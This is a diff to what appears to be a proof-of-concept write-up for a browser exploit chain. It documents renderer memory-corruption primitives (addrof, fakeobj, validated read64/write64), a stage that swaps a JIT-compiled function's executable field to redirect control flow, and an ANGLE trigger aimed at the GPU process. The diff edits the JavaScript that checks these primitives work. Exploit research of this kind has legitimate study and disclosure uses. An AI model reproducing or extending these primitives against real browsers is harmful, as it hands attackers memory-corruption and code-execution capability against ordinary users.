@@ -114,7 +114,7 @@ const angleExecuted = evidence.angleTriggered;
 evidence.chainReady = rendererPrims && angleExecuted && gpuEvidence;
 ```
 
-### Stage 5: Live in-process arbitrary read/write proof
+### Stage 5: Live in-process 64-bit read/write proof (JSValue-slot path)
 
 Stage 5 validates `read64/write64` against a live probe object with strict equality checks:
 
@@ -124,6 +124,7 @@ Stage 5 validates `read64/write64` against a live probe object with strict equal
 4. NaN fallback values are rejected as success.
 
 This stage is specifically designed to avoid stale-address or self-consistent false positives.
+It demonstrates reliable 64-bit word reads/writes on selected in-process addresses via inline-slot mapping, with NaN/canonicalization guards.
 
 ```javascript
 const jsBefore = ftoi(stage5Probe.slot0);
@@ -138,15 +139,19 @@ exploitState.write64(slot0Addr, secretWord);
 const restoreRead = exploitState.read64(slot0Addr);
 const jsRestore = ftoi(stage5Probe.slot0);
 
-const readOk = (baselineWord === secretWord) && (baselineWord === jsBefore);
-const writeOk = (markerRead === writeMarkerWord) && (jsMarker === writeMarkerWord) &&
-                (restoreRead === secretWord) && (jsRestore === secretWord);
+const baselineMatches = (baselineWord === secretWord) &&
+                        (baselineWord === jsBefore) &&
+                        (baselineWord !== 0x7ff8000000000000n);
+const markerMatches = (markerRead === writeMarkerWord) && (jsMarker === writeMarkerWord);
+const restoreMatches = (restoreRead === secretWord) && (jsRestore === secretWord);
+const readOk = baselineMatches && restoreMatches;
+const writeOk = markerMatches && restoreMatches;
 ```
 
 ### Stage 6: Native execution-path control proof
 
 Two JIT’d functions with distinct behavior are used as A/B targets.  
-The chain swaps a function executable field and validates:
+The chain swaps a function executable field (direct or slot-copy path) and validates:
 
 1. A executes B behavior during swap.
 2. A returns to original behavior after restore.
@@ -156,13 +161,16 @@ This proves userland control-flow impact in renderer, beyond pure data corruptio
 
 ```javascript
 stage6FuncA = function(x) {
-    if (x === 0x515151) return 0x11111111;
-    return (x ^ 0x55aa) | 0;
+    x |= 0;
+    if (x === 0x515151) return 0x11111111 | 0;
+    if ((x & 1) === 0) return (x ^ 0x55aa) | 0;
+    return (x + 0x1234) | 0;
 };
 stage6FuncB = function(x) {
+    x |= 0;
     if (x === 0x515151) {
         window.__stage6_native_witness = ((window.__stage6_native_witness || 0) + 1) | 0;
-        return 0x22222222;
+        return 0x22222222 | 0;
     }
     return (((x * 3) | 0) ^ 0x123456) | 0;
 };
@@ -181,6 +189,10 @@ fnA(0x515151);
 const w1 = (window.__stage6_native_witness || 0) | 0;
 dst.slot0 = orig;
 const restored = fnA(testArg);
+const w2 = (window.__stage6_native_witness || 0) | 0;
+fnA(0x515151);
+const w3 = (window.__stage6_native_witness || 0) | 0;
+const witnessSwap = (w1 === (w0 + 1)) && (w3 === w2);
 ```
 
 ---
@@ -189,7 +201,7 @@ const restored = fnA(testArg);
 
 Working in userland:
 
-1. Renderer memory corruption primitives (`addrof`, `fakeobj`, validated `read64/write64` path).
+1. Renderer memory corruption primitives (`addrof`, `fakeobj`, validated `read64/write64` JSValue-slot path).
 2. Native behavior redirection in renderer (Stage 6 swap/restore).
 3. GPU-process corruption signal path through ANGLE trigger.
 
